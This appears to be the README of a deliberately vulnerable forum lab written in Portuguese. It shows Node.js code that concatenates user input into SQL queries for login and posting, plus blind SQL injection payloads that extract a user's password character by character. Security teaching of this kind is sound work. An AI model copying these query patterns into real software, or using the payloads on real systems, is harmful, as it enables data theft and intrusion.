# Fórum com Injeção Blind SQL 

## Configuração

1. Instale as dependências:

```
npm install
```

2. Inicialize o banco de dados com dados de exemplo:

```
node setup-db.js
```

3. Inicie o servidor:

```
npm start
```

4. Acesse o fórum em: http://localhost:3000

## Vulnerabilidades

### 1. Injeção SQL na Página de Login

A página de login também é vulnerável à injeção SQL. As entradas do usuário para nome de usuário e senha são concatenadas diretamente na consulta SQL sem sanitização:

```javascript
app.post("/login", (req, res) => {
  const { username, password } = req.body;

  // VULNERÁVEL: Blind SQLi cega na consulta de login
  // concatenando diretamente a entrada do usuário na consulta SQL
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

  db.get(query, (err, user) => {
    // ...manipulação da resposta...
  });
});
```

Mensagem de teste' AND (SELECT role FROM users WHERE username='PaulAtreides')='admin' AND '1'='1

### 2. Injeção SQL Cega na Postagem de Mensagens

O endpoint `/post` para postar novas mensagens também é vulnerável à injeção SQL cega. Isso pode ser explorado para extrair dados do banco de dados:

```javascript
app.post("/post", (req, res) => {
  const { username, content, planet } = req.body;

  // VULNERÁVEL: Injeção SQL cega na postagem de mensagem
  const query = `INSERT INTO messages (username, content, planet) 
                  VALUES ('${username}', '${content}', '${
    planet || "Desconhecido"
  }')`;

  db.run(query, (err) => {
    // ...manipulação da resposta...
  });
});
```

#### Exemplo de Ataque

Ao postar uma mensagem, você pode usar o seguinte payload no campo de conteúdo para extrair informações de senha caractere por caractere:

```
Essa mensagem não tem nenhum payload', (SELECT CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='PaulAtreides')='a' THEN 'success' ELSE 'fail' END)) -- '
```

#### Explicação do Payload:

1. Fecha a string atual com uma aspa e adiciona uma vírgula
2. Usa uma instrução CASE para verificar se o primeiro caractere da senha de Paul é 'a'
3. Comenta o resto da consulta

Se o primeiro caractere for 'a', a consulta é executada e retorna success. Se não, ela retorna fail.

Para extrair a senha completa, modifique a posição (altere `1,1` para `2,1` para o segundo caractere) e tente diferentes caracteres.
